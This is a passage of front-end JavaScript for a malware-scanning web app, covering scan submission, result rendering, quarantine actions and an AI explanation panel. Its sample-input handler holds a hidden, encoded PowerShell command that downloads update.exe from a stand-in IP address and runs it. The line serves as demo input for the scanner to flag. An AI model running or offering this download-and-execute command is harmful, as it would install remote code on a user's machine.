"use strict";

/* ===================================================================
 * Core: language, API, toasts, dialogs, routing, the cells backdrop.
 * Exposed as window.CS for landing.js and repair.js.
 * =================================================================== */
const TOKEN = document.querySelector('meta[name="cyberscan-token"]').content;
const $ = (id) => document.getElementById(id);
const el = (tag, cls, text) => { const n = document.createElement(tag); if (cls) n.className = cls; if (text !== undefined) n.textContent = text; return n; };

let lang = "en";
try { const saved = localStorage.getItem("cyberscan-lang"); if (saved && CS_LANGS.has(saved)) lang = saved; } catch { /* storage off */ }
const t = (key) => (I18N[lang] && I18N[lang][key] !== undefined ? I18N[lang][key] : I18N.en[key]);

const state = {
  mode: "file", file: null, diskPath: null, lastResult: null, polling: null,
  view: null, history: null, filter: "all", settings: null, ai: null, aiJob: null,
  eventsSince: 0, cube: null,
};

const langListeners = [];
function applyLang() {
  document.documentElement.lang = lang;
  document.documentElement.dir = CS_LANGS.dir(lang);
  document.querySelectorAll(".lang-btn").forEach((b) => { b.textContent = CS_LANGS.names[lang]; b.setAttribute("aria-label", `Language: ${CS_LANGS.names[lang]}`); });
  document.querySelectorAll("[data-i18n]").forEach((node) => {
    if (node.dataset.keep) return;
    const value = t(node.dataset.i18n);
    if (typeof value === "string") node.textContent = value;
  });
  document.querySelectorAll("[data-i18n-ph]").forEach((node) => { node.placeholder = t(node.dataset.i18nPh); });
  // accessible names for controls that show no text (screen readers read these)
  document.querySelectorAll("[data-i18n-aria]").forEach((node) => {
    const value = t(node.dataset.i18nAria);
    if (typeof value === "string" && value !== node.dataset.i18nAria) node.setAttribute("aria-label", value);
  });
  requestAnimationFrame(() => { moveInk(); moveNavInk(); });
  if (state.lastResult && !$("result").hidden) renderResult(state.lastResult, false);
  if (state.view === "history" && state.history) renderHistory(false);
  if (state.settings) renderSettings();
  renderLegend($("r-legend"));
  langListeners.forEach((fn) => fn());
}
async function setLang(code) {
  if (!CS_LANGS.has(code)) return;
  try { await CS_LANGS.load(code); } catch { toast("Language file could not be loaded."); return; }
  lang = code;
  try { localStorage.setItem("cyberscan-lang", lang); } catch { /* storage off */ }
  applyLang();
}
function openLangMenu(anchor) {
  CS_LANGS.openMenu(anchor || document.querySelector(".top .lang-btn") || document.querySelector(".lang-btn"), lang, setLang);
}
document.querySelectorAll(".lang-btn").forEach((b) => b.addEventListener("click", () => openLangMenu(b)));

async function api(path, options = {}) {
  const res = await fetch(path, { ...options, headers: { "X-CyberScan-Token": TOKEN, "X-CyberScan-Lang": lang, ...(options.headers || {}) } });
  const body = await res.json().catch(() => ({}));
  if (!res.ok) throw new Error(body.error || `HTTP ${res.status}`);
  return body;
}
const postJSON = (path, data, method = "POST") => api(path, { method, headers: { "Content-Type": "application/json" }, body: JSON.stringify(data || {}) });

async function download(path) {
  const res = await fetch(path, { headers: { "X-CyberScan-Token": TOKEN } });
  if (!res.ok) throw new Error((await res.json().catch(() => ({}))).error || `HTTP ${res.status}`);
  const disposition = res.headers.get("Content-Disposition") || "";
  const match = /filename\*=UTF-8''([^;]+)/.exec(disposition);
  const name = match ? decodeURIComponent(match[1]) : "download";
  const url = URL.createObjectURL(await res.blob());
  const a = el("a"); a.href = url; a.download = name; document.body.append(a); a.click(); a.remove();
  setTimeout(() => URL.revokeObjectURL(url), 4000);
}

function toast(message, action) {
  const box = el("div", "toast");
  box.append(el("span", "", message));
  if (action) {
    const b = el("button", "primary", action.label);
    b.type = "button";
    b.addEventListener("click", () => { action.run(); close(); });
    box.append(b);
  }
  $("toasts").append(box);
  const close = () => { box.classList.add("out"); box.addEventListener("animationend", () => box.remove(), { once: true }); };
  setTimeout(close, action ? 9000 : 2800);
}

function confirmDialog(title, body, okLabel) {
  const dialog = $("confirm");
  $("confirm-title").textContent = title;
  $("confirm-body").textContent = body;
  $("confirm-ok").textContent = okLabel;
  dialog.returnValue = "";
  dialog.showModal();
  return new Promise((resolve) => dialog.addEventListener("close", () => resolve(dialog.returnValue === "ok"), { once: true }));
}

const cells = window.CyberCells ? CyberCells.create($("cells"), { mode: "hero" }) : null;

/* ---------------- routing ---------------- */
const VIEWS = ["scan", "tools", "history", "repair", "settings"];
let entered = false;
/* Two pages: the landing (ainex-ai.xyz) and the scan app (scan.ainex-ai.xyz),
 * which the server builds from this page without the landing and its heavy
 * scripts. The server writes their addresses into these meta tags. */
const SCAN_PAGE = !$("landing");
const metaUrl = (name, fallback) => {
  const v = (document.querySelector(`meta[name="${name}"]`) || {}).content || "";
  return v && !v.startsWith("__") ? v : fallback;
};
const SCAN_URL = metaUrl("cyberscan-scan-url", "app.html");
const HOME_URL = metaUrl("cyberscan-home-url", "/");
function openScanPage(view) {
  location.href = `${SCAN_URL}#/${view || "scan"}`;
}
function route() {
  const hash = location.hash.replace(/^#\/?/, "");
  let view = VIEWS.includes(hash.split("/")[0]) ? hash.split("/")[0] : null;
  if (SCAN_PAGE && !view) view = "scan";
  // old links such as ainex-ai.xyz/#/scan: the app now lives on its own page
  if (!SCAN_PAGE && view) { location.replace(`${SCAN_URL}#/${view}`); return; }
  const onLanding = !view;
  document.body.classList.toggle("on-landing", onLanding);
  if ($("landing")) $("landing").hidden = !onLanding;
  $("app").hidden = onLanding;
  if (cells) cells.setMode(onLanding ? "hero" : "ambient");
  if (onLanding) { state.view = null; window.dispatchEvent(new Event("cs:landing")); return; }
  if (!entered) { entered = true; $("app").classList.add("enter"); showView(view); return; }
  if (document.startViewTransition && state.view && state.view !== view && !matchMedia("(prefers-reduced-motion: reduce)").matches) {
    const order = VIEWS.indexOf(view) - VIEWS.indexOf(state.view);
    document.documentElement.dataset.vtDir = (order > 0) !== CS_LANGS.rtl.has(lang) ? "fwd" : "back";
    document.startViewTransition(() => showView(view));
  } else showView(view);
}
window.addEventListener("hashchange", route);

async function enterApp(x, y) {
  if (!SCAN_PAGE) {
    // a short warp, then the scan page
    const v = document.querySelector(".warp-veil");
    if (v) {
      v.style.setProperty("--wx", `${x ?? innerWidth / 2}px`);
      v.style.setProperty("--wy", `${y ?? innerHeight / 2}px`);
      v.classList.remove("go"); void v.offsetWidth; v.classList.add("go");
      await new Promise((r) => setTimeout(r, 420));
    }
    openScanPage("scan");
    return;
  }
  const veil = document.querySelector(".warp-veil");
  veil.style.setProperty("--wx", `${x ?? innerWidth / 2}px`);
  veil.style.setProperty("--wy", `${y ?? innerHeight / 2}px`);
  veil.classList.remove("go"); void veil.offsetWidth; veil.classList.add("go");
  const warp = cells ? cells.warp(x, y, 700) : Promise.resolve();
  await new Promise((r) => setTimeout(r, 640));
  location.hash = "#/scan";
  window.scrollTo(0, 0);
  await warp;
  setTimeout(() => veil.classList.remove("go"), 700);
}

/* ---------------- app navigation ---------------- */
const navButtons = [...document.querySelectorAll(".nav-btn")];
const navInk = document.querySelector(".nav-ink");
function moveNavInk() {
  const active = document.querySelector(".nav-btn.active");
  if (!active || $("app").hidden) return;
  const box = active.parentElement.getBoundingClientRect();
  const r = active.getBoundingClientRect();
  navInk.style.width = `${r.width}px`;
  navInk.style.transform = `translateX(${r.left - box.left}px)`;
}
window.addEventListener("resize", moveNavInk);

function showView(view) {
  const changed = state.view !== view;
  state.view = view;
  navButtons.forEach((b) => {
    const on = b.dataset.view === view;
    b.classList.toggle("active", on);
    if (on) b.setAttribute("aria-current", "page"); else b.removeAttribute("aria-current");
  });
  document.querySelectorAll(".view").forEach((v) => {
    const on = v.id === `view-${view}`;
    v.hidden = !on;
    if (on && changed) { v.classList.remove("entering"); void v.offsetWidth; v.classList.add("entering"); }
  });
  requestAnimationFrame(() => { moveNavInk(); moveInk(); });
  if (view === "history") loadHistory();
  if (view === "settings") { loadSettings(); loadKeys(); loadAiStatus(true); }
  window.dispatchEvent(new CustomEvent("cs:view", { detail: view }));
  if (changed) window.scrollTo({ top: 0, behavior: "smooth" });
}

/* ===================================================================
 * Scan composer
 * =================================================================== */
const tabs = [...document.querySelectorAll(".tab")];
const ink = document.querySelector(".tab-ink");
function moveInk() {
  const active = document.querySelector(".tab.active");
  if (!active || !active.offsetParent) return;
  const box = active.parentElement.getBoundingClientRect();
  const r = active.getBoundingClientRect();
  ink.style.width = `${r.width}px`;
  ink.style.transform = `translateX(${r.left - box.left}px)`;
}
tabs.forEach((tab) => tab.addEventListener("click", () => {
  state.mode = tab.dataset.mode;
  tabs.forEach((x) => { x.classList.toggle("active", x === tab); x.setAttribute("aria-selected", x === tab); });
  document.querySelectorAll("#form [data-panel]").forEach((p) => { p.hidden = p.dataset.panel !== state.mode; });
  moveInk();
  updateReady();
  const field = state.mode === "url" ? $("url") : state.mode === "text" ? $("text") : null;
  if (field) field.focus();
}));
window.addEventListener("resize", moveInk);

const drop = $("drop");
function chooseFile(file) {
  if (!file) return;
  state.file = file;
  state.diskPath = null;
  drop.classList.add("chosen");
  $("drop-label").dataset.keep = "1";
  $("drop-label").textContent = `${file.name} · ${formatBytes(file.size)}`;
  updateReady();
  if (window.CSHash) CSHash.check(file);
}
function chooseFiles(files) {
  const list = [...(files || [])];
  if (list.length > 1 && window.CSBatch) { CSBatch.start(list); return; }
  chooseFile(list[0]);
}
function chooseDisk(path, name, size) {
  state.diskPath = path;
  state.file = null;
  if (window.CSHash) CSHash.clear();
  drop.classList.add("chosen");
  $("drop-label").dataset.keep = "1";
  $("drop-label").textContent = `${name} · ${formatBytes(size || 0)}`;
  updateReady();
}
function resetChoice() {
  state.file = null; state.diskPath = null;
  drop.classList.remove("chosen");
  delete $("drop-label").dataset.keep;
  $("drop-label").textContent = t("dropTitle");
  $("file").value = "";
  if (window.CSHash) CSHash.clear();
}
$("file").addEventListener("change", (e) => chooseFiles(e.target.files));
["dragenter", "dragover"].forEach((ev) => drop.addEventListener(ev, (e) => { e.preventDefault(); drop.classList.add("over"); }));
["dragleave", "drop"].forEach((ev) => drop.addEventListener(ev, (e) => { e.preventDefault(); e.stopPropagation(); drop.classList.remove("over"); }));
drop.addEventListener("drop", (e) => chooseFiles(e.dataTransfer.files));
$("pick-disk").addEventListener("click", async () => {
  $("pick-disk").disabled = true;
  try {
    const picked = await postJSON("/api/pick", { kind: "file" });
    if (picked.path && picked.name) chooseDisk(picked.path, picked.name, picked.size);
  } catch (err) { toast(err.message); }
  $("pick-disk").disabled = false;
});
$("url").addEventListener("input", updateReady);
$("text").addEventListener("input", updateReady);
$("sample").addEventListener("click", () => {
  $("text").value = "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA\nInvoke-WebRequest http://198.51.100.7/update.exe -OutFile $env:TEMP\\update.exe; Start-Process $env:TEMP\\update.exe";
  updateReady();
  $("text").focus();
});

function updateReady() {
  const ready = state.mode === "file" ? !!(state.file || state.diskPath)
    : state.mode === "url" ? $("url").value.trim().length > 3
    : $("text").value.trim().length > 0;
  $("go").disabled = !ready;
}

function formatBytes(n) {
  if (n < 1024) return `${n} B`;
  if (n < 1048576) return `${(n / 1024).toFixed(1)} KB`;
  return `${(n / 1048576).toFixed(1)} MB`;
}

$("form").addEventListener("submit", async (e) => {
  e.preventDefault();
  if ($("go").disabled) return;
  const limit = state.settings?.maximum_file_size;
  if (state.mode === "file" && state.file && limit && state.file.size > limit) {
    showError(t("tooBig")(Math.round(limit / 1048576)));
    return;
  }
  const label = state.mode === "file" ? (state.diskPath || state.file.name) : state.mode === "url" ? $("url").value.trim() : "";
  showProgress(label);
  try {
    let job;
    if (state.mode === "file" && state.diskPath) {
      job = await postJSON("/api/scan", { mode: "path", value: state.diskPath });
    } else if (state.mode === "file") {
      job = await api("/api/scan/file", {
        method: "POST",
        headers: { "X-Filename": encodeURIComponent(state.file.name), "Content-Type": "application/octet-stream" },
        body: state.file,
      });
    } else {
      job = await postJSON("/api/scan", { mode: state.mode, value: $(state.mode).value });
    }
    // the online version answers with the finished scan; the local server with a job to follow
    if (job.status) showJob(job, job.id); else poll(job.id);
  } catch (err) {
    showError(err.message);
  }
});

function scanPath(path) {
  location.hash = "#/scan";
  const name = path.split(/[\\/]/).pop();
  tabs[0].click();
  chooseDisk(path, name, 0);
  $("drop-label").textContent = name;
  $("form").requestSubmit();
}

function poll(id) {
  clearTimeout(state.polling);
  api(`/api/scan/${id}`).then((job) => showJob(job, id)).catch(() => showError(t("network")));
}

function showJob(job, id) {
  {
    if (!job.stages) { showError(job.error || t("network")); return; }
    renderStages(job.stages);
    if (job.status === "running") { state.polling = setTimeout(() => poll(id), 220); return; }
    if (job.status === "failed") { showError(job.error); return; }
    renderStages(job.stages.map((s) => ({ ...s, state: "complete" })));
    state.history = null;
    // let the scan theater finish its sweep: at least 1.4 s on screen
    const wait = Math.max(450, 1400 - (performance.now() - (state.scanStarted || 0)));
    setTimeout(() => {
      state.lastResult = job.result;
      renderResult(job.result, true);
      if (cells) { cells.setMode("ambient"); if (job.result.classification === "NO_INDICATORS_OBSERVED") cells.heal(); }
      const p = plainOf(job.result);
      notify(job.result.target, p ? p.summary.headline : job.result.classification);
    }, wait);
  }
}

function showProgress(label) {
  state.scanStarted = performance.now();
  $("batch").hidden = true;
  $("error").hidden = true;
  $("result").hidden = true;
  document.querySelector(".composer").hidden = true;
  $("progress").hidden = false;
  $("progress-target").textContent = label || "";
  restartAnim($("progress"));
  renderStages([]);
  $("stage-detail").textContent = "";
  if (cells) cells.setMode("scan");
  window.dispatchEvent(new CustomEvent("cs:scan-start", { detail: label || "" }));
}

function showError(message) {
  $("progress").hidden = true;
  document.querySelector(".composer").hidden = false;
  $("error").hidden = false;
  $("error").textContent = t("failed") + message;
  restartAnim($("error"));
  if (cells) cells.setMode("ambient");
  updateReady();
}

function renderStages(stages) {
  [...document.querySelectorAll(".stages li")].forEach((li, i) => {
    li.classList.remove("running", "complete");
    const s = stages[i];
    if (s && s.state !== "pending") li.classList.add(s.state);
  });
  const current = [...stages].reverse().find((s) => s.detail);
  if (current) $("stage-detail").textContent = current.detail;
  window.dispatchEvent(new CustomEvent("cs:stages", { detail: stages }));
}

/* ===================================================================
 * Result
 * =================================================================== */
const RISK_COLOR = { NO_INDICATORS_OBSERVED: "--ok", REVIEW: "--warn", SUSPICIOUS: "--bad" };
const TONE_COLOR = { ok: "--ok", warn: "--warn", danger: "--bad", info: "--accent", neutral: "--muted" };
const SEV_COLOR = { high: "--bad", critical: "--bad", medium: "--warn", low: "--accent", info: "--muted" };

function plainOf(r) { return (r.plain && (r.plain[lang] || r.plain.en)) || null; }

function renderResult(r, animate) {
  document.querySelector(".composer").hidden = true;
  $("batch").hidden = true;
  $("progress").hidden = true;
  $("error").hidden = true;
  const view = $("result");
  view.hidden = false;
  if (animate) { view.querySelectorAll(":scope > .card").forEach(restartAnim); window.scrollTo({ top: 0, behavior: "smooth" }); }

  const plain = plainOf(r);
  const s = plain && plain.summary;
  const fallback = t("verdicts")[r.classification] || [r.classification, r.classification, r.summary];
  const tone = s ? (TONE_COLOR[s.tone] || "--accent") : (RISK_COLOR[r.classification] || "--accent");
  document.documentElement.style.setProperty("--risk", `var(${tone})`);
  $("badge").textContent = s ? `${s.symbol} ${t("toneBadge")[s.tone] || fallback[0]}` : fallback[0];
  $("verdict-title").textContent = s ? s.headline : fallback[1];
  $("verdict-body").textContent = s ? s.sentence : fallback[2];
  $("verdict-advice").textContent = s ? [s.advice, s.limit].filter(Boolean).join(" ") : "";
  $("verdict-advice").hidden = !(s && (s.advice || s.limit));
  const notice = $("notice");
  notice.hidden = !(s && s.notice);
  if (s && s.notice) { notice.textContent = s.notice; notice.classList.toggle("danger", s.notice_tone === "danger"); }
  const chips = $("facts-chips");
  chips.replaceChildren(...((s && s.facts) || []).map((f) => el("li", "", f)));
  if (r.elapsed) chips.append(el("li", "", t("elapsed")(r.elapsed)));
  $("target").textContent = r.target;
  $("when").hidden = !r.timestamp;
  if (r.timestamp) $("when").textContent = t("scannedAt")(formatWhen(r.timestamp, true));
  $("gauge").setAttribute("aria-label", `${r.combined_score} / 100`);
  $("limits").textContent = r.limitations;

  const meter = $("meter");
  const circumference = 326.73;
  const offset = circumference * (1 - r.combined_score / 100);
  if (animate) {
    meter.style.strokeDashoffset = circumference;
    requestAnimationFrame(() => requestAnimationFrame(() => { meter.style.strokeDashoffset = offset; }));
    countUp($("score"), r.combined_score, 1700);
    impact(r);
  } else {
    meter.style.strokeDashoffset = offset;
    $("score").textContent = r.combined_score;
  }

  renderActions(r);
  renderFindings(r, plain, animate);
  renderDetails(r, plain, animate);
  renderChecks(plain);
  renderAttack(r);
  renderTech(r);
  if (animate) { selectTab("findings"); $("ai-card").hidden = true; stopAi(); }
  if (state.cube && currentTab() === "structure") state.cube.setData(r.structure);
  window.dispatchEvent(new CustomEvent("cs:result", { detail: { result: r, animate } }));
}

/* The result arrives: cells burst out of the gauge, a ring pulses, and a
 * suspicious result gives the card a short shake. */
function impact(r) {
  if (matchMedia("(prefers-reduced-motion: reduce)").matches) return;
  const card = document.querySelector(".verdict");
  const gauge = $("gauge");
  card.classList.remove("impact", "shake");
  void card.offsetWidth;
  setTimeout(() => {
    card.classList.add("impact");
    if (r.classification === "SUSPICIOUS") card.classList.add("shake");
    const burst = el("div", "burst");
    for (let i = 0; i < 26; i++) {
      const s = el("i");
      const a = (i / 26) * Math.PI * 2 + Math.random() * 0.3;
      const d = 90 + Math.random() * 120;
      s.style.setProperty("--dx", `${Math.cos(a) * d}px`);
      s.style.setProperty("--dy", `${Math.sin(a) * d}px`);
      s.style.setProperty("--r", `${Math.random() * 360}deg`);
      s.style.setProperty("--s", (0.5 + Math.random() * 0.9).toFixed(2));
      s.style.animationDelay = `${Math.random() * 0.12}s`;
      burst.append(s);
    }
    gauge.append(burst);
    setTimeout(() => burst.remove(), 1600);
    const gr = gauge.getBoundingClientRect();
    if (cells) cells.pulse(gr.left + gr.width / 2, gr.top + gr.height / 2);
  }, 1350);
}

function renderFindings(r, plain, animate) {
  const list = $("evidence");
  list.replaceChildren();
  const findings = plain ? plain.details.findings : r.evidence.map((f) => ({ severity: String(f.severity).toLowerCase(), title: f.evidence, body: f.explanation, word: f.severity, where: f.category, count: 1 }));
  if (!findings.length) {
    const li = el("li", "empty");
    const top = el("div", "ev-top");
    top.append(el("strong", "", t("noEvidence")));
    li.append(top, el("span", "body", t("noEvidenceBody")));
    list.append(li);
    return;
  }
  findings.forEach((f, i) => {
    const li = el("li");
    li.style.setProperty("--sev", `var(${SEV_COLOR[f.severity] || "--muted"})`);
    li.style.setProperty("--d", animate ? `${0.2 + i * 0.06}s` : "0s");
    const top = el("div", "ev-top");
    top.append(el("strong", "", f.title + (f.count > 1 ? ` ×${f.count}` : "")), el("span", "sev", f.word || ""));
    li.append(top);
    if (f.body && f.body.trim() !== f.title.trim()) li.append(el("span", "body", f.body));
    if (f.where) li.append(el("em", "", f.where));
    list.append(li);
  });
}

function renderDetails(r, plain, animate) {
  const facts = $("facts");
  facts.replaceChildren();
  ((plain && plain.details.facts) || [["SHA-256", r.sha256 || "–"]]).forEach(([k, v]) => {
    const row = el("div");
    const dd = el("dd", /sha|بصمة/i.test(k) ? "hash" : "", v);
    row.append(el("dt", "", k), dd);
    facts.append(row);
  });
  if (plain && plain.details.score_line) {
    const row = el("div");
    row.append(el("dt", "", "∑"), el("dd", "", plain.details.score_line));
    facts.append(row);
  }
  drawSpark(r.entropy, animate);

  const pe = $("pe");
  pe.replaceChildren();
  if (!r.pe) { pe.append(el("p", "muted", t("noPe"))); return; }
  const sections = el("div", "pe-sections");
  (r.pe.sections || []).forEach((s) => {
    const row = el("div", "pe-row");
    const bar = el("div", "pe-bar");
    const fill = el("i");
    const rgb = CyberCube.entropyColor(s.entropy || 0);
    fill.style.background = `rgb(${rgb.map((v) => v | 0).join(",")})`;
    bar.append(fill);
    row.append(el("span", "", s.name || "?"), bar, el("span", "", (s.entropy || 0).toFixed(2)));
    sections.append(row);
    requestAnimationFrame(() => requestAnimationFrame(() => { fill.style.width = `${Math.min(100, (s.entropy / 8) * 100)}%`; }));
  });
  pe.append(el("h3", "", t("peSections")), sections);
  if ((r.pe.suspicious_imports || []).length) {
    const tags = el("div", "tag-list");
    r.pe.suspicious_imports.forEach((name) => tags.append(el("span", "", name)));
    pe.append(el("h3", "", t("peImports")), tags);
  }
}

function renderChecks(plain) {
  const list = $("checks");
  list.replaceChildren();
  ((plain && plain.details.checks) || []).forEach((c, i) => {
    const li = el("li");
    li.style.setProperty("--tone", `var(${TONE_COLOR[c.tone] || "--muted"})`);
    li.style.setProperty("--d", `${i * 0.04}s`);
    li.append(el("i", "", c.symbol), el("b", "", c.name), el("small", "", c.reason || c.state));
    list.append(li);
  });
}

function renderAttack(r) {
  const mitre = $("mitre");
  mitre.replaceChildren();
  if (!(r.mitre || []).length) mitre.append(el("li", "muted", t("noMitre")));
  (r.mitre || []).forEach((m) => {
    const li = el("li");
    li.append(el("code", "", m.id || "T?"), document.createTextNode(m.name || ""));
    if (m.tactic) li.append(el("small", "muted", ` · ${m.tactic}`));
    mitre.append(li);
  });
  const yara = $("yara");
  yara.replaceChildren();
  if (!(r.yara || []).length) yara.append(el("li", "muted", t("noYara")));
  (r.yara || []).forEach((y) => {
    const li = el("li");
    li.append(el("code", "", y.rule || y.name || "rule"), document.createTextNode((y.meta && y.meta.description) || (y.tags || []).join(", ")));
    yara.append(li);
  });
}

function renderTech(r) {
  const raw = $("raw");
  raw.replaceChildren();
  r.evidence.forEach((f) => {
    const li = el("li");
    li.append(el("b", "", `[${String(f.severity).toUpperCase()}] ${f.evidence}`), document.createTextNode(` · +${f.contribution} · ${f.category}\n${f.explanation}`));
    li.style.whiteSpace = "pre-wrap";
    raw.append(li);
  });
  const ml = $("ml");
  ml.replaceChildren();
  const p = r.prediction || {};
  const scores = Object.entries(p.class_scores || {});
  ml.append(el("p", "muted", `${t("model")}: ${r.model_status || p.status || "–"}`));
  if (scores.length) {
    const bars = el("div", "ml-bars");
    scores.forEach(([name, value]) => {
      const row = el("div", "pe-row");
      const bar = el("div", "pe-bar"); const fill = el("i");
      fill.style.background = "var(--accent-2)";
      bar.append(fill);
      row.append(el("span", "", name), bar, el("span", "", Number(value).toFixed(2)));
      bars.append(row);
      requestAnimationFrame(() => requestAnimationFrame(() => { fill.style.width = `${Math.min(100, Number(value) * 100)}%`; }));
    });
    ml.append(bars);
  }
  const engines = $("engines");
  engines.replaceChildren();
  Object.entries(r.engines || {}).forEach(([name, status]) => {
    const li = el("li");
    li.append(el("b", "", name), document.createTextNode(` ${status}`));
    engines.append(li);
  });
}

/* result tabs */
const rtabs = [...document.querySelectorAll(".rtab")];
function currentTab() { return (rtabs.find((b) => b.classList.contains("active")) || rtabs[0]).dataset.tab; }
function selectTab(name) {
  rtabs.forEach((b) => { const on = b.dataset.tab === name; b.classList.toggle("active", on); b.setAttribute("aria-selected", on); });
  document.querySelectorAll(".rpanel").forEach((p) => { p.hidden = p.dataset.tab !== name; });
  if (name === "structure") {
    const r = state.lastResult;
    const has = r && r.structure && r.structure.entropy && r.structure.entropy.length;
    $("no-structure").hidden = !!has;
    document.querySelector(".app-cube").hidden = !has;
    $("r-legend").hidden = !has;
    if (has) {
      if (!state.cube) state.cube = CyberCube.create($("r-cube"), $("r-cube-tip"));
      requestAnimationFrame(() => state.cube.setData(r.structure));
    }
  }
}
rtabs.forEach((b) => b.addEventListener("click", () => selectTab(b.dataset.tab)));

function renderLegend(list) {
  if (!list) return;
  const colors = ["rgb(30,58,138)", "rgb(56,189,248)", "rgb(244,114,182)", "rgb(248,113,113)"];
  list.replaceChildren(...t("legend").map((label, i) => { const li = el("li"); const sw = el("i"); sw.style.background = colors[i]; li.append(sw, label); return li; }));
}

/* actions */
function actionButton(label, onClick, cls = "") {
  const b = el("button", `ghost ${cls}`.trim(), label);
  b.type = "button";
  b.addEventListener("click", async () => {
    b.disabled = true;
    try { await onClick(); } catch (err) { toast(err.message); }
    b.disabled = false;
  });
  return b;
}

function renderActions(r) {
  const bar = $("actions");
  bar.replaceChildren();
  const id = r.record_id;
  const isFile = (r.mode || "") === "File";
  const onDisk = isFile && r.exists;
  const plain = plainOf(r);
  const suggested = (plain && plain.summary.actions) || ["quarantine", "reveal"];
  const buttons = [];
  if (id && r.quarantined) {
    buttons.push(actionButton(t("aRestore"), async () => {
      await postJSON(`/api/history/${id}/restore`);
      r.quarantined = false; r.exists = true; state.history = null;
      toast(t("restored")); renderActions(r);
    }, "go"));
  } else if (id && onDisk && suggested.includes("quarantine")) {
    buttons.push(actionButton(t("aQuarantine"), async () => {
      if (!(await confirmDialog(t("qConfirmTitle"), t("qConfirmBody"), t("qConfirm")))) return;
      await postJSON(`/api/history/${id}/quarantine`);
      r.quarantined = true; r.exists = false; state.history = null;
      toast("🔒 " + t("quarantined")); renderActions(r);
    }, "warn"));
  }
  if (id && onDisk) buttons.push(actionButton(t("aReveal"), () => postJSON(`/api/history/${id}/reveal`)));
  if (onDisk) buttons.push(actionButton(t("aRepair"), () => { location.hash = "#/repair"; window.CSRepair && CSRepair.openPath(r.target); }));
  if (id && state.ai && state.ai.enabled && state.ai.state === "ready") buttons.push(actionButton("✦ " + t("aAi"), () => startAi(id)));
  if (id) buttons.push(actionButton(t("aExportTxt"), () => download(`/api/history/${id}/export?format=txt`)));
  if (id) buttons.push(actionButton(t("aExportJson"), () => download(`/api/history/${id}/export?format=json`)));
  if (!id) {
    // no saved record (the online version keeps none): build the files from the result in the browser
    const base = String(r.target || "scan").split(/[\\/]/).pop().replace(/[^\w.\- ]/g, "_").slice(0, 80) || "scan";
    const save = (text, name, type) => { const a = el("a"); a.href = URL.createObjectURL(new Blob([text], { type })); a.download = name; document.body.append(a); a.click(); a.remove(); setTimeout(() => URL.revokeObjectURL(a.href), 4000); };
    if (r.report_text) buttons.push(actionButton(t("aExportTxt"), () => save(r.report_text, `${base}.cyberscan.txt`, "text/plain")));
    buttons.push(actionButton(t("aExportJson"), () => save(JSON.stringify(r, null, 2), `${base}.cyberscan.json`, "application/json")));
  }
  if (r.sha256) buttons.push(actionButton(t("aCopyHash"), async () => { await navigator.clipboard.writeText(r.sha256); toast(t("copied")); }));
  buttons.push(actionButton(t("copy"), async () => { await navigator.clipboard.writeText(r.report_text); toast(t("copied")); }));
  buttons.push(actionButton("⎙ " + t("pPrint"), () => { $("result").dataset.printed = new Date().toLocaleString(lang); window.print(); }));
  buttons.push(actionButton(t("again"), () => newScan()));
  buttons.forEach((b, i) => b.style.setProperty("--i", i));
  bar.append(...buttons);
}

function newScan() {
  state.lastResult = null;
  $("result").hidden = true;
  $("batch").hidden = true;
  $("error").hidden = true;
  const composer = document.querySelector(".composer");
  composer.hidden = false;
  resetChoice();
  restartAnim(composer);
  requestAnimationFrame(moveInk);
  updateReady();
  stopAi();
}

/* AI explanation */
async function loadAiStatus(force) {
  if (state.ai && !force) return state.ai;
  try { state.ai = await api("/api/ai/status"); } catch { state.ai = { state: "no_server", enabled: false, models: [] }; }
  renderAiSettings();
  return state.ai;
}

async function startAi(recordId) {
  const card = $("ai-card");
  card.hidden = false;
  card.classList.remove("done");
  restartAnim(card);
  const text = $("ai-text");
  text.textContent = "";
  text.classList.add("typing");
  card.scrollIntoView({ behavior: "smooth", block: "nearest" });
  const job = await postJSON(`/api/history/${recordId}/ai`, { lang });
  state.aiJob = job.id;
  const tick = async () => {
    if (state.aiJob !== job.id) return;
    let s;
    try { s = await api(`/api/ai/${job.id}`); } catch { text.classList.remove("typing"); return; }
    text.textContent = s.text;
    if (s.status === "running") { setTimeout(tick, 180); return; }
    text.classList.remove("typing");
    card.classList.add("done");
    if (s.status === "failed") text.textContent = t("aiErrors")[s.error] || t("aiErrors").error;
  };
  tick();
}
function stopAi() {
  if (state.aiJob) { postJSON(`/api/ai/${state.aiJob}/stop`).catch(() => {}); state.aiJob = null; }
  $("ai-text").classList.remove("typing");
}
$("ai-stop").addEventListener("click", () => { stopAi(); $("ai-text").textContent += "\n" + t("aiErrors").stopped; });

function drawSpark(entropy, animate) {
  const line = $("spark-line"), fill = $("spark-fill");
  const pts = (entropy && entropy.trajectory) || [];
  $("e-mean").textContent = pts.length ? entropy.mean.toFixed(2) : "–";
  $("e-peak").textContent = pts.length ? entropy.peak.toFixed(2) : "–";
  $("e-jumps").textContent = pts.length ? entropy.anomalies : "–";
  if (pts.length < 2) { line.setAttribute("d", ""); fill.setAttribute("d", ""); return; }
  const W = 300, H = 90;
  const coords = pts.map((v, i) => [(i / (pts.length - 1)) * W, H - 4 - (Math.min(v, 8) / 8) * (H - 8)]);
  const d = coords.map(([x, y], i) => `${i ? "L" : "M"}${x.toFixed(1)},${y.toFixed(1)}`).join("");
  line.setAttribute("d", d);
  fill.setAttribute("d", `${d}L${W},${H}L0,${H}Z`);
  line.setAttribute("pathLength", "1");
  line.style.strokeDasharray = 1;
  line.style.strokeDashoffset = animate ? 1 : 0;
  line.classList.remove("drawing");
  fill.classList.remove("on");
  if (animate) { void line.getBoundingClientRect(); line.classList.add("drawing"); }
  requestAnimationFrame(() => fill.classList.add("on"));
}

function countUp(node, target, ms) {
  const start = performance.now();
  const step = (now) => {
    const p = Math.min((now - start) / ms, 1);
    node.textContent = Math.round(target * (1 - Math.pow(1 - p, 4)));
    if (p < 1) requestAnimationFrame(step);
  };
  requestAnimationFrame(step);
}
function restartAnim(node) { node.style.animation = "none"; void node.offsetWidth; node.style.animation = ""; }

/* ===================================================================
 * History
 * =================================================================== */
const TRASH = '<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 7h16M10 11v6M14 11v6M6 7l1 13h10l1-13M9 7V4h6v3"/></svg>';

function formatWhen(iso, full) {
  const d = new Date(iso);
  if (Number.isNaN(d.getTime())) return "";
